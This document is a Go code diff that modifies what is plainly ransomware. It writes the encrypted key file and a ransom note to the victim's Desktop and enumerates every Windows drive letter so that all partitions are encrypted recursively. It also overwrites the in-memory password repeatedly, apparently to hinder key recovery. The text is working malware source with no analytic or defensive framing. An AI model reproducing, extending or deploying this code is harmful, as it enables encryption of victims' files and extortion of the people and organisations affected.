@@ -14,6 +14,7 @@ import (
 	"io"
 	"io/fs"
 	"os"
+	"os/user"
 	"path/filepath"
 )
 
@@ -39,9 +40,9 @@ func start(msg string) *ransom {
 	}
 
 	password := MessageToPEM(rns.encrypt(rns.password))
-	export(password, "password.ransom")
+	export(password, "password.ransom", "Desktop")
 
-	export([]byte(msg), "READ_ME")
+	export([]byte(msg), "READ_ME", "Desktop")
 
 	return rns
 }
@@ -69,10 +70,18 @@ func (keys *ransom) encrypt(msg string) []byte {
 	return cipher_text
 }
 
-// export (encrypted AES) key in a working directory
-func export(key []byte, label string) {
-	wd, _ := os.Getwd()
-	path := filepath.Join(wd, label)
+// export (encrypted AES) key to Desktop
+// or in a working directory
+func export(key []byte, label string, path string) {
+	if path == "" {
+		wd, _ := os.Getwd()
+		path = filepath.Join(wd, label)
+	} else {
+		comp, cerr := user.Current()
+		handleError(cerr)
+		homedir := comp.HomeDir
+		path = filepath.Join(homedir, path, label)
+	}
 	err := os.WriteFile(path, key, 0600)
 	handleError(err)
 }
@@ -155,20 +164,22 @@ func main() {
 	aesEn = nil
 
 	// find partitions
-	var param []string
+	var drive_params []string
 	for _, drive := range "ABCDEFGHIJKLMNOPQRSTUVWXYZ" {
 		f, err := os.Open(string(drive) + ":\\")
 		if err == nil {
-			param = append(param, string(drive))
+			drive_params = append(drive_params, string(drive))
 		}
 		f.Close()
 	}
 
 	// handle recursive encryption for found partitions
-	for _, d := range param {
+	for _, d := range drive_params {
 		filepath.WalkDir(d, r.walk)
 	}
 
 	// at the end, replace token in memory
-	r.password = token()
+	for x := 0; x < 10; x++ {
+		r.password = token()
+	}
 }
